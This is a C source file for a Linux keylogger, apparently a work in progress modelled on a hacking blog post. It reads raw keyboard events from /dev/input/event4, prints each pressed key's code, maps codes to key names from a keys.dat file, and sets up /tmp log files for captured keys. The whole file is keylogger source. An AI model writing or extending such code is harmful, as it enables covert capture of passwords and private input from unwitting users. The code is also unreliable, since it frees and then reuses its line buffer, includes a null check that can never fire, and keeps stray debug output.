// https://cocomelonc.github.io/linux/2025/06/03/linux-hacking-5.html
// To Add:
// Auto detect the event file
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <linux/input.h>
#include <fcntl.h>
#include <string.h>
#define ERROR_PATH "/tmp/errors_keylogger.log"
#define CAPTURE_PATH "/tmp/captured_keys.log"

int create_logs_files(void);
int read_from_event4(struct input_event *ev, int fd);
void write_error_log(const char *error); // TO WRITE
int	translate_keycode(unsigned short code, char key[], int size);

int main(void)
{
	struct input_event ev;
	char key[23];
	int size_key;
	int fd;

	size_key = 23;
	if (!create_logs_files())
	{
		printf("Unable to create log files\n");
		return (1);
	}
	fd = open("/dev/input/event4", O_RDONLY);
	if (fd < 0)
	{
		printf("Unable to read event4, is it in sudo ?\n");
		return (0);
	}
	while (1) //
	{
		memset(&ev, 0, sizeof(ev));
		if (!read_from_event4(&ev, fd))
		{
			printf("cc\n");
			break;
		}
		if (ev.type == EV_KEY && ev.value == 1)
		{
			printf("keycode\t%d\n\n", ev.code);
			if (!translate_keycode(ev.code, key, size_key))
				strncpy(key, "UNKNOW", size_key);
			printf("key translated: %s\n", key);
		}
		fflush(stdout);
	}
}

int read_from_event4(struct input_event *ev, int fd)
{
	ssize_t n;

	n = read(fd, ev, sizeof(*ev));
	//printf("n: %ld\n", n);
	if (n < 0)
		return (0);
	return (1);
}

int create_logs_files(void)
{
	FILE *error_logs;
	FILE *capture_logs;

	if (access(ERROR_PATH, W_OK) < 0)
	{
		error_logs = fopen(ERROR_PATH, "a");
		if (!error_logs)
			return (0);
		fclose(error_logs);
	}
	if (access(CAPTURE_PATH, W_OK) < 0)
	{
		capture_logs = fopen(CAPTURE_PATH, "a");
		if (!capture_logs)
			return (0);
		fclose(capture_logs);
	}
	return (1);
}

int	translate_keycode(unsigned short code, char key[], int size)
{
	FILE *file;
	char *line;
	size_t size_line;
	unsigned short lcode;
	int i;
	int	ki;

	size_line = 0;
	line = NULL;
	ki = 0;
	key[0] = '\0';
	file = fopen("./keys.dat", "r");
	if (!file)
	{
		//write_error_logs("Unable to read keys.dat file");
		return (0);
	}
	while (getline(&line, &size_line, file) > EOF && key[0] == '\0')
	{
		i = 0;
		lcode = 0;
		printf("cc\n");
		// take the code
		while (line[i] != ' ')
			lcode = lcode * 10 + (line[i++] - '0');
		if (lcode != code)
		{
			free(line);
			continue;
		}
		// goto key's name
		while (line[i] != '#')
			++i;
		++i;
		while (line[i] != '\n' && ki < size - 1)
			key[ki++] = line[i++];
		key[ki] = '\0';
	}
	free(line);
	if (!key)
		return (0);
	return (1);
}
